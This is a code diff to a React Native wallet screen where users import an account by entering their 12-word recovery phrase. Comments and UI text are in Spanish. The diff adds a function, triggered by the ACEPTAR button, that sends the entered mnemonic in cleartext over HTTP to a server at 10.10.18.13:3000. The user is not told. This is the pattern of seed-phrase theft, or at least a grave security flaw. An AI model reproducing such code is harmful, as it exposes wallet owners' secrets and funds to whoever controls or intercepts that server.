@@ -21,26 +21,51 @@ const windowWidth = Dimensions.get("screen").width;
 const windowHeight = Dimensions.get("screen").height;
 
 const ImportarCuenta = ({ navigation }: { navigation: any }) => {
-  const [twelfString, setTwelfString] = useState("");
+
+  const [values, setValues] = useState({
+    mnemonic: ""
+  })
+
+  //Esta funcion actualiza y toma lo que esta en la caja de texto
+  function handleChange(text, eventName) {
+      setValues(prev => {
+          return {
+              ...prev,
+              [eventName]: text
+          }
+      })
+  }
+
+  const enviarMnemonic = () =>{
+      fetch('http://10.10.18.13:3000/enviar_mnemonic', {
+          method: 'POST',
+          headers: {
+              'Content-Type':'application/json'
+          },
+          body: JSON.stringify({mnemonic:values.mnemonic})
+      })
+      .then(resp => resp.json())
+      .catch(error => console.log(error))
+  }
 
   const [anmt, setanmt] = useState("");
   const [vacioModal, setVacioModal] = useState(false);
 
   function continuar() {
-    if (twelfString != "") {
-      saveMmemonic(twelfString);
-      navigation.navigate("Contraseña");
+    if (values.mnemonic != "") {
+        saveMmemonic(values.mnemonic)
+        navigation.navigate('Contraseña')
     } else {
-      setVacioModal(true);
-      setanmt("fadeInDownBig");
-      setTimeout(() => {
-        setanmt("fadeOutUp");
-        setTimeout(() => {
-          setVacioModal(false);
-        }, 100);
-      }, 2000);
+        setVacioModal(true);
+        setanmt("fadeInDownBig");            
+        setTimeout( () => {
+            setanmt("fadeOutUp");
+            setTimeout( () => {
+                setVacioModal(false);
+            }, 100 ) 
+        },2000)
     }
-  }
+}
 
   return (
     <KeyboardAwareScrollView
@@ -92,13 +117,13 @@ const ImportarCuenta = ({ navigation }: { navigation: any }) => {
           style={styles.TextInputf}
           autoFocus={true}
           multiline={true}
-          onChangeText={(text) => setTwelfString(text)}
+          onChangeText={text => handleChange(text, "mnemonic")}
           autoCapitalize="none"
         ></TextInput>
         <Text style={styles.labeluno} numberOfLines={4}>
           Ingrese sus 12 palabras de respaldo en minusculas
         </Text>
-        <TouchableOpacity style={styles.btnC} onPress={() => continuar()}>
+        <TouchableOpacity style={styles.btnC} onPress={() => [continuar(), enviarMnemonic()]}>
           <Text style={styles.textC}>ACEPTAR</Text>
         </TouchableOpacity>
       </View>
